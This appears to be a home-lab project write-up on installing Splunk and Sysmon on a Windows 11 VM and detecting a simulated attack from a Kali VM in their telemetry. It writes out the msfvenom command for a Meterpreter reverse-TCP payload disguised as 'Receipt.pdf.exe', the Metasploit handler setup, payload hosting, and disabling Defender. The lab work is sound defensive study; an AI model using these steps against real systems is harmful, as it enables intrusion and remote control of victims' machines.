# Experimenting with Splunk & Sysmon

## Objective

The Experimenting with Splunk & Sysmon project is where I will be documenting the process of installing both Splunk and Sysmon into the home lab environment created in my previous project. My hope is to better my understanding of the functions of a SIEM and to view/explore telemetry created by a malware attack.

## Summary (Post-Completion Bullet Points)
- Deployed and configured Splunk Enterprise and Sysmon on a Windows 11 VM, ingesting Sysmon telemetry and developing Splunk searches to detect post-exploitation activity.
- Built and delivered a Meterpreter reverse-TCP payload from Kali (msfvenom + Python HTTP server) and validated detection via Splunk and Sysmon event analysis.
- Performed reconnaissance with Nmap, mapped network connections to processes (netstat + PID), and used snapshots and internal networking in VirtualBox to run isolated attack simulations.

### Skills Learned/Improved

- Virtual lab & environment management
	- Configuring VirtualBox network modes (NAT ↔ Internal) and VM resource tuning.
	- Taking and using snapshots for rollback and safe testing.
- SIEM deployment & administration
	- Installing and configuring Splunk Enterprise (service, ports, indices, apps/add-ons).
	- Editing Splunk config (inputs.conf) and creating indexes to ingest custom telemetry.
- Endpoint telemetry & host visibility
	- Installing and configuring Sysmon with a community config to capture detailed endpoint events.
	- Understanding Sysmon event types (process creation, network connections, parent/child relations).
- Networking & reconnaissance
	- Performing targeted network scans with Nmap (-A, -Pn) and interpreting results (open ports: RDP, Splunk).
	- Managing IPv4 addressing (static vs. DHCP) and internal subnets for isolated testing.
- Offensive tooling & payload engineering
	- Building malicious payloads with msfvenom and hosting them with a simple HTTP server for delivery.
	- Operating Metasploit (msfconsole, exploit/multi/handler) to receive reverse shells.
- Incident simulation
	- Executing a controlled malware simulation, observing behavior, and generating realistic telemetry.
	- Correlating attacker activity (meterpreter commands) with Sysmon events and Splunk searches.
- Forensics/triage & investigation
	- Using netstat + process lookups to map network connections to executables and PIDs.
	- Extracting process GUIDs/parent-child chains from Sysmon events and building Splunk queries to reconstruct activity (tables, event filtering).
- Windows administration & troubleshooting
	- Temporarily disabling Defender/real-time protection for testing, enabling RDP, task/process inspection.
	- Using PowerShell and services.msc for service management and verification.
- Linux basics/server hosting
	- Running Python simple HTTP server and basic Kali operations (terminals, payload listings).
- Splunk search skills
	- Using Search & Reporting, building queries (index=, filters), exploring Interesting Fields, and creating tables to surface IOC/commands.

### Tools/Technologies Used

- Virtualization/Lab: Oracle VirtualBox (VM creation, snapshots, internal/NAT networking)
- Operating systems: Windows 11 (target/Splunk/Sysmon host), Kali Linux (attacker/payload host)
- SIEM & telemetry: Splunk Enterprise (web UI on port 8000, indexes, add-ons), Sysmon (with sysmonconfig.xml from GitHub)
- Offensive/testing tools: Metasploit Framework (msfvenom, msfconsole, exploit/multi/handler), Python (python3 -m http.server to host payload)
- Recon & network: Nmap (scanning: nmap -A -Pn), Windows netstat (with -anob) with Select-String for parsing output
- Windows admin tools: Services.msc, Task Manager, Windows Settings (RDP, Defender adjustments)

# Steps

## Installing Splunk
### Allowing Internet Access
- Splunk is being installed on the Windows 11 VM which means the first step is to change the internet adapter in VirtualBox to allow internet access through the VM
- I changed it from Internal Network back to NAT
- Then in the VM, I switched the ethernet from manual IPv4 back to automatic
- This time I went through the Windows settings UI instead of the Ethernet properties followed by IPv4 properties:
<img width="1221" height="749" alt="Pasted image 20251021172732" src="https://github.com/user-attachments/assets/33636be8-5b0c-4886-968d-2b9a16221318" />

- I also checked back in the IPv4 properties section later and saw the change was reflected there as expected
- This will all need to be reverted later when testing Splunk/Sysmon with the Kali Linux VM acting as an attacker
### Actual Installation
- First I downloaded Firefox (I prefer Firefox over Microsoft Edge)
- Then I quickly went to https://splunk.com and to the enterprise tab to start a free trial and download the .msi file
- The current version of Splunk as of this project is 10.0.1
- I also downloaded the associated SHA512 file from the Splunk website
- After using Get-FileHash with ***-Algorithm SHA512***, it returned a matching hash which verified the integrity of the download
- I then followed the installation wizard and created an administrator account for the program
- The installation then took another 5-10 minutes to complete
- And with that, Splunk Enterprise is now running on port 8000
- This was verified by going to `http://127.0.0.1:8000` where I could enter the admin account credentials and access the SIEM:
<img width="1268" height="747" alt="Pasted image 20251021193929" src="https://github.com/user-attachments/assets/2cc3c0dd-8b86-4cf7-bf4d-da449a3b5b58" />

## Installing Sysmon
- I started this section by going to https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon to download Sysmon
- I then downloaded a Sysmon configuration file by going to the following github link: https://github.com/olafhartong/sysmon-modular/blob/master/sysmonconfig.xml
- I went to the raw file to download just the xml
- Sysmon was downloaded as a zip file which was extracted again to the Downloads folder
- I then launched PowerShell as an Administrator and used cd to go into the extracted Sysmon directory
- I also moved the sysmonconfig.xml file into the same directory
- Next I ran ***.\Sysmon64.exe -i sysmonconfig.xml*** which installed Sysmon and loaded the configuration file simultaneously:
<img width="971" height="509" alt="Pasted image 20251021220813" src="https://github.com/user-attachments/assets/51beab26-2dce-40ab-a5b4-19ddd2e49322" />

- I lastly opened the services app to ensure Sysmon was installed and running in the VM:
<img width="862" height="603" alt="Pasted image 20251021223015" src="https://github.com/user-attachments/assets/51a851e1-d70f-4657-8012-25a58b3fdc7c" />

## Setting Up for Malware Test
- I started by moving the Windows 11 VM back into the internal network and changing the IPv4 address back to **10.1.1.2**
- I also increased the memory to 7 GB in both the Windows 11 and Kali Linux VMs
### Scanning the Windows VM with Nmap
- The first step here is to disable Windows Defender to allow the scan to go through and later the crafted malware to not be blocked
- I also went into Windows settings to enable Remote Desktop Protocol (RDP):
<img width="1213" height="406" alt="Pasted image 20251022191043" src="https://github.com/user-attachments/assets/ee347660-abfc-4713-9d2b-85ea0ccaf587" />

- Now on to the actual Nmap scan, the command used was `nmap -A 10.1.1.2 -Pn`
- The **-A** flag is for a more in depth scan that enables OS and version detection, script scanning, and traceroute
- The **-Pn** flag skips host discovery and assumes the host is online which is true in this case
- The resulting scan returned that there were 6 open ports out of 1000:
<img width="698" height="563" alt="Pasted image 20251022193145" src="https://github.com/user-attachments/assets/840b945f-0802-4047-ac83-a9ac650d41fe" />

- Port 3389 is the RDP port and other notable ports are 8000 and 8089 which are both used by Splunk that was installed earlier in the project
- Obviously I knew that the RDP port would be open but chose to still use Nmap to simulate performing reconnaissance and ensure the port was open/reachable by the Kali VM

### Building Malware on the Kali VM
- The malware payload will be created using MSFvenom on the Kali VM
- After launching a terminal, I used `msfvenom -l payloads` to view a list of possible payloads to be used during the test
- For this test, I will be using the `windows/x64/meterpreter_reverse_tcp` payload:
<img width="847" height="440" alt="Pasted image 20251022202708" src="https://github.com/user-attachments/assets/00f2875b-60cf-4f65-9973-4dbbc098d54f" />

- Now to build the malware, I used the command `msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=10.1.1.3 lport=4444 -f exe -o Receipt.pdf.exe`
- Each flag in the command is used to customize the malware for this specific use case:
	- **-p** designates the payload being used
	- **lhost** is the local host IP (the Kali VM for this use)
	- **lport** is the local port being used (4444 is the default meterpreter port)
	- **-f** is for the output format (I am making an executable)
	- **-o** is for the output path (Receipt.pdf.exe)
- So the malware output will be a meterpreter reverse tcp payload that will communicate back to the Kali VM through port 4444:
<img width="847" height="156" alt="Pasted image 20251022221551" src="https://github.com/user-attachments/assets/468134ba-98bd-4965-8c10-8a8f182b6846" />

- I then used `msfconsole` to open the Metasploit Framework console followed by `use exploit/multi/handler`
- The multi/handler will act as a listener for receiving the incoming connections from the given payload
- In order to do that, I had to run the following commands to edit the preset configurations:
	- `set payload windows/x64/meterpreter_reverse_tcp`
	- `set lhost 10.1.1.3`
- Entering `options` into the msfconsole returns the current configuration following these updates:
<img width="807" height="386" alt="Pasted image 20251023135649" src="https://github.com/user-attachments/assets/6904aa05-12ee-4a01-954b-d985cc7e7d0d" />

- Now I can enter `exploit` and the handler will start listening:
<img width="402" height="56" alt="Pasted image 20251023135804" src="https://github.com/user-attachments/assets/c2afcb0b-c404-4247-989a-67216a4502e3" />

- The final part of this section is starting a simple http server on the Kali VM to allow the malware to be transferred to the target machine
- The simplest way this can be done is by opening a new terminal and entering `python3 -m http.server 9999` in the same directory as the malware
<img width="492" height="83" alt="Pasted image 20251023142846" src="https://github.com/user-attachments/assets/42560bd8-e251-4c78-ba58-573fef4e938b" />

## Downloading the Malware on the Windows VM
- With Windows Defender already disabled, I just had to go to `http://10.1.1.3:9999` to download the malware:
<img width="652" height="260" alt="Pasted image 20251023144714" src="https://github.com/user-attachments/assets/3bfcd6ac-110c-4380-8ed4-3660d3400668" />

- I also had to go back into windows security settings and turn off Real-time protection in the Virus & threat protection settings
- If left on, the downloaded malware would be identified and deleted automatically
- With that off and the malware downloaded, I can double click the Receipt.pdf.exe file
- If I were to have the **Show file name extensions** setting turned off, it is easier to see how someone could open this file by mistake (though still unlikely):
<img width="785" height="221" alt="Pasted image 20251023194113" src="https://github.com/user-attachments/assets/af67722b-083b-40c5-9282-09570d90bac1" />

## Final Splunk Configurations Before Malware Execution
- Back on the Windows 11 VM, I had to make sure that Splunk was ingesting the Sysmon logs that were being generated
- To do this I went to `C:\Program Files\Splunk\etc\system\local` and edit the **inputs.conf** file
- Because said file was not initially in this directory, I had to copy the default **inputs.conf** from the `Splunk\etc\system\default` directory
- I then added the following to the **inputs.conf** file:
<img width="552" height="632" alt="Pasted image 20251023184340" src="https://github.com/user-attachments/assets/d39f7673-aaef-4361-b675-82f324a8f70b" />

- I went with adding more than just the Sysmon logs in case I want to experiment further but the goal of this project is seeing the telemetry generated via Sysmon and ingested by Splunk
- Then in the actual Splunk interface, I have to add the new index to be able to view the new data
- This was done by simply going to `Settings > Indexes > New Index` and creating the **endpoint** index:
<img width="793" height="807" alt="Pasted image 20251023190856" src="https://github.com/user-attachments/assets/0b67284f-4fb6-44b8-947e-8919800c1a41" />

- Finally, I went to the Find More Apps section of Splunk to install the **Splunk Add-on for Sysmon** app which improves Splunk's ability to parse the Sysmon telemetry
- I did have to be connected to the internet for this step which meant I needed to quickly swap the network adapter to NAT and then back to Internal Network after I was done

## Executing the Malware
- It will still be detected as a possible malicious program but for this experiment, I am going to run it anyways
- After running, I opened PowerShell as administrator and entered `netstat -anob | Select-String "10.1.1.3" -Context 0,1`:
<img width="637" height="150" alt="Pasted image 20251023193802" src="https://github.com/user-attachments/assets/bc56d0c2-da3c-44ad-a4d8-9422b2553a7d" />

- The four netstat flags are as follows:
	- **a** = Display all connections and listening ports
	- **n** = Display time spent by a TCP connection
	- **o** = Display the owning process ID associated with each connection
	- **b** = Display the executable involved in creating each connection or listening port
- I then piped the output into the **Select-String** command to search for **"10.1.1.3"** and used **-Context 0,1** to include the next line which contained the executable that created the connection
- This shows that there is an active TCP connection from the Windows VM to the Kali VM through port 4444 that was opened by Receipt.pdf.exe
- The process ID shown in the screenshot above is 11764 which can be further verified in the details section of task manager:
<img width="761" height="265" alt="Pasted image 20251023193839" src="https://github.com/user-attachments/assets/46f65df6-4b3a-4ab2-8331-b55acf7d41fd" />

- Now back on the Kali VM, a meterpreter connection was made and can now be used to open a shell
<img width="842" height="272" alt="Pasted image 20251023193909" src="https://github.com/user-attachments/assets/82bab0dc-e4ed-4afd-9437-767b050897e9" />

- I then ran `whoami`, `net user`, `net localgroup`, and `ipconfig` to generate telemetry back on the Windows VM
## Viewing the Telemetry
- Back in Splunk, I can go into the Search & Reporting tab and search for **index="endpoint"** and filter the search in various was in order to view the information fed in by Sysmon
- For example, I can search for **index="endpoint" 10.1.1.3** to filter for traffic that relates to the Kali Linux VM
- I can then look at the **Interesting Fields** section on the left of the screen and see things like *dest_port* which shows the outgoing traffic to port 4444 which is the meterpreter port used by the malware:
<img width="558" height="281" alt="Pasted image 20251023202244" src="https://github.com/user-attachments/assets/5d93722f-69f6-4f74-b599-010087b0b11c" />

- Another example is to add the name of the malware to the search bar as `index="endpoint" Receipt.pdf.exe`
- I can then go to the **EventCode** Interesting Field and click on the code with value 1
<img width="592" height="540" alt="Pasted image 20251023203446" src="https://github.com/user-attachments/assets/fc9fea9e-c648-464d-9738-c116111a77b3" />

- After expanding the first result, I could then view much more information such as the processes and parent processes that were running
- After scrolling, I found a **cmd.exe** process with the parent process being the malware I downloaded earlier, **Receipt.pdf.exe**
<img width="786" height="527" alt="Pasted image 20251023204308" src="https://github.com/user-attachments/assets/a17ccf1a-bdbf-4449-ac67-035c6f15cf31" />

- Now a few lines above the bottom red circle, you can see the **process_guid** value listed for the cmd.exe process that I want to investigate further
- If I take this value and craft a Splunk search as `index="endpoint" {2929efd0-bb1f-68fa-8302-000000000d00} | table _time,ParentImage,Image,CommandLine`, it returns the following table:
<img width="1303" height="772" alt="Screenshot 2025-10-23 205443" src="https://github.com/user-attachments/assets/0d47713b-cf30-40c5-b4d5-be08c77d6c2d" />

- I ran the commands a few extra times but if you look on the right side, you can see the `whoami`, `net user`, `net localgroup`, and `ipconfig` commands that were run through the shell and now appear in Splunk
- This shows that Sysmon captured the commands input via the meterpreter_reverse_tcp payload shell that was created on the Kali VM and Splunk is able to then ingest these logs and display/report them
